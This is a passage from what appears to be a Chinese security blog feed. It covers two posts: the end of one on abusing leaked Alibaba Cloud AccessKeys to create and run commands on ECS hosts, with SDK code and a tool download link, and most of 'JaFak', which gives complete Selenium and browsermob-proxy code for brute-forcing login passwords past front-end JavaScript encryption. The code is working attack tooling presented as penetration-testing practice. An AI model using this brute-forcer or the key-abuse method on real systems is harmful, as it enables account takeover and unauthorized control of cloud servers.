CreateCommandRequest</span><br><span class="line">client &#x3D; AcsClient(&#39;&lt;accessKeyId&gt;&#39;, &#39;&lt;accessSecret&gt;&#39;, &#39;cn-hangzhou&#39;)</span><br><span class="line">request &#x3D; CreateCommandRequest()</span><br><span class="line">request.set_accept_format(&#39;json&#39;)</span><br><span class="line">response &#x3D; client.do_action_with_exception(request)</span><br><span class="line"># python2:  print(response) </span><br><span class="line">print(str(response, encoding&#x3D;&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure><p>这里会返回一个云助手命令id，返回结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;RequestId&quot;: &quot;E69EF3CC-94CD-42E7-8926-F133B86387C0&quot;,</span><br><span class="line">&quot;CommandId&quot;: &quot;c-7d2a745b412b4601b2d47f6a768d3a14&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from aliyunsdkcore.client import AcsClient</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ClientException</span><br><span class="line">from aliyunsdkcore.acs_exception.exceptions import ServerException</span><br><span class="line">from aliyunsdkecs.request.v20140526.InvokeCommandRequest import InvokeCommandRequest</span><br><span class="line">client &#x3D; AcsClient(&#39;&lt;accessKeyId&gt;&#39;, &#39;&lt;accessSecret&gt;&#39;, &#39;cn-hangzhou&#39;)</span><br><span class="line">request &#x3D; InvokeCommandRequest()</span><br><span class="line">request.set_accept_format(&#39;json&#39;)</span><br><span class="line">response &#x3D; client.do_action_with_exception(request)</span><br><span class="line"># python2:  print(response) </span><br><span class="line">print(str(response, encoding&#x3D;&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure><p>返回结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;RequestId&quot;: &quot;E69EF3CC-94CD-42E7-8926-F133B86387C0&quot;,</span><br><span class="line">&quot;InvokeId&quot;: &quot;t-7d2a745b412b4601b2d47f6a768d3a14&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安全组部分就省略了，根据API文档</p><h3 id="2、通过GET-POST-使用"><a href="#2、通过GET-POST-使用" class="headerlink" title="2、通过GET/POST 使用"></a>2、通过GET/POST 使用</h3><p>这里先说下公共请求参数</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/881799538.png"></p><h6 id="2-1-GET请求"><a href="#2-1-GET请求" class="headerlink" title="2.1 GET请求"></a>2.1 GET请求</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ecs.aliyuncs.com&#x2F;?Action&#x3D;DescribeInstanceStatus</span><br><span class="line">&amp;RegionId&#x3D;cn-hangzhou</span><br><span class="line">&amp;PageSize&#x3D;1</span><br><span class="line">&amp;PageNumber&#x3D;1</span><br><span class="line">&amp;InstanceId.1&#x3D;i-bp1j4i2jdf3owlhe****</span><br><span class="line">&amp;&lt;公共请求参数&gt;</span><br></pre></td></tr></table></figure><p>XML返回格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;DescribeInstanceStatusResponse&gt;</span><br><span class="line">&lt;PageNumber&gt;1&lt;&#x2F;PageNumber&gt;</span><br><span class="line">&lt;InstanceStatuses&gt;</span><br><span class="line">&lt;InstanceStatus&gt;</span><br><span class="line">&lt;Status&gt;Running&lt;&#x2F;Status&gt;</span><br><span class="line">&lt;InstanceId&gt;i-bp1j4i2jdf3owlhe****&lt;&#x2F;InstanceId&gt;</span><br><span class="line">&lt;&#x2F;InstanceStatus&gt;</span><br><span class="line">&lt;&#x2F;InstanceStatuses&gt;</span><br><span class="line">&lt;TotalCount&gt;58&lt;&#x2F;TotalCount&gt;</span><br><span class="line">&lt;PageSize&gt;1&lt;&#x2F;PageSize&gt;</span><br><span class="line">&lt;RequestId&gt;746C3444-9A24-4D7D-B8A8-DCBF7AC8BD66&lt;&#x2F;RequestId&gt;</span><br><span class="line">&lt;&#x2F;DescribeInstanceStatusResponse&gt;</span><br></pre></td></tr></table></figure><p>JSON返回格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;PageNumber&quot;: 1,</span><br><span class="line">&quot;InstanceStatuses&quot;: &#123;</span><br><span class="line">&quot;InstanceStatus&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">&quot;Status&quot;: &quot;Running&quot;,</span><br><span class="line">&quot;InstanceId&quot;: &quot;i-bp1j4i2jdf3owlhe****&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">&quot;TotalCount&quot;: 58,</span><br><span class="line">&quot;PageSize&quot;: 1,</span><br><span class="line">&quot;RequestId&quot;: &quot;746C3444-9A24-4D7D-B8A8-DCBF7AC8BD66&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="2-2-POST请求"><a href="#2-2-POST请求" class="headerlink" title="2.2 POST请求"></a>2.2 POST请求</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ecs.aliyuncs.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko&#x2F;20100101 Firefox&#x2F;84.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line">Action&#x3D;DescribeInstanceStatus&amp;RegionId&#x3D;cn-hangzhou&amp;PageSize&#x3D;1&amp;PageNumber&#x3D;1&amp;InstanceId.1&#x3D;i-bp1j4i2jdf3owlhe****&amp;&lt;公共请求参数&gt;</span><br></pre></td></tr></table></figure><p>返回跟GET方式一样</p><h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><p>图形化界面，没什么说的。附一张截图相信大家都明白了。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1351824295.png"></p><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>阿里云为运维人员与开发人员提供了方便，但同时自身也要加强安全意识，注意自己的key不要泄露，不然直接接管阿里云所有esc主机，风险比一般高危漏洞都还要高。</p><blockquote><p>下载链接及漏洞文章<br>项目链接：<br><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a><br>工具下载链接：<br><a href="https://github.com/mrknow001/aliyun-accesskey-Tools/releases/download/1.0/Aliyun-.AK.Tools.exe">https://github.com/mrknow001/aliyun-accesskey-Tools/releases/download/1.0/Aliyun-.AK.Tools.exe</a></p><p>欢迎关注Gamma实验室,后续会推出更多实用方便的工具，爱您！<br>文章链接：<br><a href="https://www.freebuf.com/articles/web/255717.html">https://www.freebuf.com/articles/web/255717.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具推送 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JaFak：一款无视js前端加密的账号密码爆破工具</title>
      <link href="2020/12/13/JaFak/"/>
      <url>2020/12/13/JaFak/</url>
      
        <content type="html"><![CDATA[<h3 id="前因："><a href="#前因：" class="headerlink" title="前因："></a>前因：</h3><p>其实这文讲得重点不是工具的开发，而是一种思想：</p><blockquote><p>完全可以利用一些可自动化测试来帮助我们进行渗透测试任务</p></blockquote><p>为什么会想到写这个脚本？爱恨情仇加纠缠</p><p>在我的潜意识里，我只会在真正用的时候才会去找轮子，造轮子，所以这次的脚本也是因为一次实际的常规测试引发的一连串连锁反应，我称之为铁索连环！</p><p>在一次授权的系统测试中，我发现了系统找回密码功能处有个很有趣的事情，找回密码进行验证的时候，需要输入用户名和相应绑定的邮箱，当我输入正确的用户名时候，系统会提示“用户名或邮箱错误”</p><p>没毛病，模糊信息返回，但是当我输入正确的用户名和错误的邮箱时，系统会提示“输入邮箱错误”，相信各位大佬都知道了，这里挖掘到一枚用户名枚举的漏洞，通过系统的提示系统，批量爆破系统存在的用户名。</p><p>但是，交过洞的大佬们都知道，除非是金融行业，或者其他很重要系统，一般是不会收这样的漏洞，收也是低位（超低的哟），恰巧我做的这个项目，不是那一类，所以没啥卵用。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/912996750.png"></p><p>但是但是！这不像我们不曲不折的安全人员！毕竟国内的饭不太好要是吧（玩笑话）。</p><h3 id="差点劝退"><a href="#差点劝退" class="headerlink" title="差点劝退"></a>差点劝退</h3><p>所以我决定搞点事情，把这个洞危害加大，我第一个想的就是爆破固定的用户名与密码，因为系统的登录页面，无论是你用户名错误还是密码错误，都返回“用户名和密码或错误！”，且没有验证码验证，也不限制次数，又因为我们枚举了正确的用户名，这个提示相当于变成了“密码错误，请重新输入”，就可以爆破固定用户名的密码了，burp启动，直接就冲了!</p><p>看到密码后面有%3D%3D，我逐渐兴奋，这不就是base64加密吗？直接python脚本，先base64加密，然后爆破，舒服，等着出密码就行了！</p><p>但是得先验证是否是base64加密，然后放入burp解码，我擦，解不出来，我刚开始还不相信，多试了几次，还真不是！</p><p>没事没事，冷静冷静！这玩意密码学嘛，这不有手就能把他的加密逻辑给逆出来，哎呀，我擦，我的手勒？</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/752137079.png"></p><p>然后打开js，进行源码分析，漂亮，一个混淆把我思路绕城了钢丝球！<br>直接给我整劝退，再见项目，再见网安，再见打工人，回家种田去了。</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3594481489.png"></p><h3 id="天马行空"><a href="#天马行空" class="headerlink" title="天马行空"></a>天马行空</h3><p>但是吧，我觉得难不倒我，我还可以抢救一下，因为我以前看过大佬，通过本地建立服务，去调用系统的js，然后为己用，但是也得找到加密函数的接口，bp上面就有插件，本地起服务，但是也得找到加密的入口函数！还是佩服那些前端调试硬刚的大佬，真是大佬！</p><p>因为我以前见过国外的某性能测试软件，不知道啥名字了，反正挺贵的，能自动控制浏览器进行性能设置，就好比一个机器人帮你输入，帮你提交，帮你访问网站，我觉得酷死了，然后我就想了想咋实现的，想起自动化，我肯定第一时间想起了python，Google一搜还真有！</p><p>有事找百度，google准没错！</p><h3 id="开始奇幻之旅"><a href="#开始奇幻之旅" class="headerlink" title="开始奇幻之旅"></a>开始奇幻之旅</h3><p>为什么说奇幻勒?因为爬坑的故事真的一把鼻涕一把泪的，别说了，哭晕在厕所。</p><p>开始使用selenium框架。。。。。。。。。。。。。</p><p>Selenium 是什么？一句话，自动化测试工具。</p><p>它支持各种浏览器，包括 Chrome，Safari，Firefox 等主流界面式浏览器，如果你在这些浏览器里面安装一个 Selenium 的插件，那么便可以方便地实现 Web 界面的测试。换句话说叫 Selenium 支持这些浏览器驱动。</p><p>这里用的东西python+selenium+browsermobproxy</p><h3 id="爱-之-初-步-体-验"><a href="#爱-之-初-步-体-验" class="headerlink" title="爱 之 初 步 体 验"></a>爱 之 初 步 体 验</h3><p>我们先来一个小例子感受一下 Selenium，这里我们用 Chrome 浏览器来测试（当然你可以i缓存其他的浏览器不影响）。<br>注意在尝试这段代码之前，你得安装chrome浏览器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">browser &#x3D; webdriver.Chrome()</span><br><span class="line">browser.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#x2F;&#39;)</span><br></pre></td></tr></table></figure><p>运行这段代码，它会自动打开chrome浏览器，然后打开<a href="http://www.baidu.com/%E8%BF%99%E4%B8%AA%E7%BD%91%E9%A1%B5%EF%BC%8C%E5%AE%8C%E5%85%A8%E5%8F%AF%E8%A7%86%E5%8C%96%EF%BC%8C%E5%9B%A0%E4%B8%BA%E4%BD%A0%E4%BC%9A%E7%9C%8B%E5%88%B0%E4%BD%A0%E7%9A%84chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%B5%8F%E8%A7%88%E8%BF%99%E4%B8%AA%E8%BF%87%E7%A8%8B%E3%80%82">http://www.baidu.com/这个网页，完全可视化，因为你会看到你的chrome浏览器打开浏览这个过程。</a></p><blockquote><p>如果代码执行错误，浏览器没有打开，那么应该是没有装 Chrome 浏览器或者 Chrome 驱动没有配置在环境变量里。下载驱动，然后将驱动文件路径配置在环境变量即可</p></blockquote><p>但是因为我们的测试需要提交爆破的用户名和密码打开网页是远远不够的，所以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;http:&#x2F;&#x2F;www.python.org&quot;)</span><br><span class="line">assert &quot;Python&quot; in driver.title#等待加载结束</span><br><span class="line">elem &#x3D; driver.find_element_by_name(&quot;q&quot;)</span><br><span class="line">elem.send_keys(&quot;pycon&quot;)</span><br><span class="line">elem.send_keys(Keys.RETURN)</span><br><span class="line">print（driver.page_source）</span><br></pre></td></tr></table></figure><p>这段代码会遍历打开<a href="http://www.python.org这个网页/">http://www.python.org这个网页</a>，等Python字体加载出来的时候，才遍历html 树状结构，找到name为q的标签，然后填入pycon，然后模拟点击</p><p>这里为什么要等待加载，因为可能网站有jq什么的加载没完全，再点击会失去原来的韵味。</p><p>根据实际需求的情况需要这段代码被我改成了这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;xxxxxxxx&quot;)</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(</span><br><span class="line">username)#找到输入用户名的标签，把用户名输入进去</span><br><span class="line">driver.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)##找到输入密码的标签，把用户名输入进去</span><br><span class="line">driver.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).click()#找到登录标签，然后点击</span><br></pre></td></tr></table></figure><p>这样就模拟了一次完整的用户名和密码输入，以及点击登录的效果.</p><blockquote><p>坑点1<br>这里为什么要用css_selector，本来可以直接使用by_class_name的，但是因为我实际利用场景这里很特殊，class的名字之间有空格，使用by_class_name获取不到，如果class的名字没有空格，就可以直接获取，当然也可以通过标签的其他的属性访问到.</p></blockquote><p>但是这样只能提交一次登录请求，而且还得必须清空上一次填写的账号密码，再改进</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;xxxxxxxx&quot;)</span><br><span class="line">#循环加在这</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(</span><br><span class="line">username)#找到输入用户名的标签，把用户名输入进去</span><br><span class="line">driver.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)##找到输入密码的标签，把用户名输入进去</span><br><span class="line">driver.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).click()#找到登录标签，然后点击</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br></pre></td></tr></table></figure><p>再此基础上加个循环，可以批量爆破他的密码了，因为chrome浏览器已经自动加载调用js帮我们加密好了变成了密文，然后再发送过去，真是nice鸭！</p><p>但是有个问题,就是我无法捕获服务器的返回包,刚开始使用selenium抓取chromedriver的network</p><blockquote><p>抓到的流量还得自己分析,就很难受,然后就是使用了browsermobproxy 来开启一个中间的代理,让我的chrome先去经过browermobproxy,然后browermobproxy抓取我的http流量,就可以拿到了服务器返回包了.就很nice!</p></blockquote><p>Browsermob-Proxy是一个开源的Java编写的基于LittleProxy的代理服务。Browsermob-Proxy的具体流程有点类似与Flidder或Charles。即开启一个端口并作为一个标准代理存在，当HTTP客户端（浏览器等）设置了这个代理，则可以抓取所有的请求细节并获取返回内容。<br>安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">直接到项目的github上下载打好的压缩包即可:https:&#x2F;&#x2F;github.com&#x2F;lightbody&#x2F;browsermob-proxy&#x2F;releases，支持Linux和Windows。</span><br><span class="line"></span><br><span class="line">安装对应的python包:</span><br><span class="line"></span><br><span class="line">pip install browsermob-proxy</span><br><span class="line">下载好browsermob-proxy之后，放在指定一个目录，例如我这里是 D:\apk\browsermob-proxy-2.1.4-bin\browsermob-proxy-2.1.4这个路径下，所以下面示例代码如：</span><br><span class="line"></span><br><span class="line">from browsermobproxy import Server</span><br><span class="line">server &#x3D; Server(&quot;路径&quot;)</span><br><span class="line">server.start()</span><br><span class="line">proxy &#x3D; server.create_proxy()</span><br></pre></td></tr></table></figure><p>配置Proxy启动WebDriver:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.chrome.options import Options</span><br><span class="line"></span><br><span class="line">chrome_options &#x3D; Options()</span><br><span class="line">chrome_options.add_argument(&#39;--proxy-server&#x3D;&#123;0&#125;&#39;.format(proxy.proxy))</span><br><span class="line">driver &#x3D; webdriver.Chrome(chrome_options&#x3D;chrome_options)</span><br></pre></td></tr></table></figure><p>值得注意的是:</p><blockquote><p>browsermob-proxy起的Server默认是8080端口</p></blockquote><p>可以直接进入到Server这个类里面去修改他的监听端口<br>直接上根据实际测试需求最终代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">from selenium.webdriver.common.desired_capabilities import DesiredCapabilities</span><br><span class="line">from browsermobproxy import Server</span><br><span class="line">from selenium.webdriver.chrome.options import Options</span><br><span class="line">class Brower_scan():</span><br><span class="line">def __init__(self,url,username,password_dir):</span><br><span class="line">self.url &#x3D; url</span><br><span class="line">self.response_result &#x3D; []</span><br><span class="line">self.result&#x3D;&#123;&#125;</span><br><span class="line">self.init_browsermobproxy()</span><br><span class="line">self.init_chrome()</span><br><span class="line">self.init_dict_list(username,password_dir)</span><br><span class="line">self.result_handing()</span><br><span class="line">self.end_env()</span><br><span class="line">def init_dict_list(self,username,password_dir):</span><br><span class="line">with open(password_dir,&quot;r&quot;) as f:</span><br><span class="line">self.password_list &#x3D; f.readlines()</span><br><span class="line">for password in self.password_list:</span><br><span class="line">self.fill_out_a_form(username,password.replace(&#39;\n&#39;,&#39;&#39;))</span><br><span class="line">self.wget_response()</span><br><span class="line">def init_browsermobproxy(self):</span><br><span class="line">self.server &#x3D; Server(&quot;browsermob-proxy-2.1.4\\bin\\browsermob-proxy.bat&quot;)#browermobproxy文件的位置</span><br><span class="line">self.server.start()</span><br><span class="line">self.proxy &#x3D; self.server.create_proxy()</span><br><span class="line">self.chrome_options &#x3D; Options()</span><br><span class="line">self.chrome_options.add_argument(&#39;--proxy-server&#x3D;&#123;0&#125;&#39;.format(self.proxy.proxy))</span><br><span class="line">self.chrome_options.add_argument(&#39;--headless&#39;)#这里加了一个参数,不启动chrome浏览器,省去了启动的时间,更快了</span><br><span class="line">def init_chrome(self):</span><br><span class="line">try:</span><br><span class="line">self.chrome &#x3D; webdriver.Chrome(chrome_options&#x3D;self.chrome_options)</span><br><span class="line">self.proxy.new_har(&quot;ht_list2&quot;, options&#x3D;&#123;&#39;captureContent&#39;: True&#125;)</span><br><span class="line">self.chrome.get(self.url)</span><br><span class="line">except Exception as e:</span><br><span class="line">print(&quot;Chrome浏览器启动失败！\n&quot;)</span><br><span class="line">return 0</span><br><span class="line">def fill_out_a_form(self,username,password):</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input ivu-input-with-prefix&#39;]&quot;).send_keys(</span><br><span class="line">username)</span><br><span class="line">self.chrome.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;ivu-input  ivu-input-with-suffix&#39;]&quot;).send_keys(password)</span><br><span class="line">self.chrome.find_element_by_css_selector((&quot;[class&#x3D;&#39;ivu-btn ivu-btn-primary  ivu-btn-large&#39;]&quot;)).click()</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;iivu-input ivu-input-with-prefix&#39;]&quot;).clear()</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input  ivu-input-with-suffix&#39;]&quot;).clear()</span><br><span class="line">def wget_response(self):</span><br><span class="line">result &#x3D; self.proxy.har</span><br><span class="line">for entry in result[&#39;log&#39;][&#39;entries&#39;]:</span><br><span class="line">_url &#x3D; entry[&#39;request&#39;][&#39;url&#39;]</span><br><span class="line">print(_url)</span><br><span class="line">if &quot;password&quot; in _url and &quot;username&quot; in _url:</span><br><span class="line">_response &#x3D; entry[&#39;response&#39;]</span><br><span class="line">_content &#x3D; _response[&#39;content&#39;]</span><br><span class="line"># 获取接口返回内容</span><br><span class="line">self.response_result.append(_response[&#39;content&#39;][&#39;text&#39;])</span><br><span class="line">self.result &#x3D; dict(zip(self.password_list, self.response_result))</span><br><span class="line">def result_handing(self):</span><br><span class="line">for key,value in self.result.items():</span><br><span class="line">print(&quot;密码：&#123;key&#125; :结果：&#123;result&#125;&quot;.format(key&#x3D;key,result&#x3D;value))</span><br><span class="line">def end_env(self):</span><br><span class="line">try:</span><br><span class="line">self.server.stop()</span><br><span class="line">self.chrome.quit()</span><br><span class="line">find_netstat &#x3D; os.popen(&quot;netstat -ano | findstr 8080&quot;)#开的什么端口杀什么端口的进程</span><br><span class="line">pid &#x3D; find_netstat.read().split()[4]</span><br><span class="line">kail_pid &#x3D; os.popen(&quot;taskkill &#x2F;F &#x2F;PID &#123;PID&#125;&quot;.format(PID&#x3D;pid))</span><br><span class="line">print(kail_pid.read())</span><br><span class="line">return 1</span><br><span class="line">except IndexError as e:</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">Brower &#x3D; Brower_scan(url,&#39;admin&#39;,&#39;password.txt&#39;)</span><br></pre></td></tr></table></figure><p>拿去实战爆破效果一浏览:</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/619490803.png"></p><blockquote><p>坑点2<br>实际爆破效果不是这样的<br>密码输入依次为 123456 123456456789 123456455678955664 ……………………一直增大 ,好像缓存没有清楚一样,但是我实际确实clear了</p></blockquote><p>这个问题把我搞了很久,百思不得其解<br>最后,在部门大神的指点下,成功找到原因,并解决问题,果然听君一席话,胜读10年书,不愧是大佬!!</p><blockquote><p>因为起的浏览器默认是记住上次密码的,当我输入一个admin账号的时候,在输入密码,然后浏览器记住了我的账号了,虽然错误,然后继续输入admin,然后浏览器会自动补全123456,然后我再输入了一个456789 结果就成了123456456789了….. 就这个理</p></blockquote><p>更改只需要把顺序调换一下就行了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(</span><br><span class="line">username)</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br><span class="line">self.chrome.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)</span><br><span class="line">self.chrome.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).click()</span><br></pre></td></tr></table></figure><p>只需要在它补全之前,再次clear就行</p><blockquote><p>坑点3<br>如果登录标签使用click属性,因为元素被包裹的问题,click多了会报错!,解决办法是使用send_keys()</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 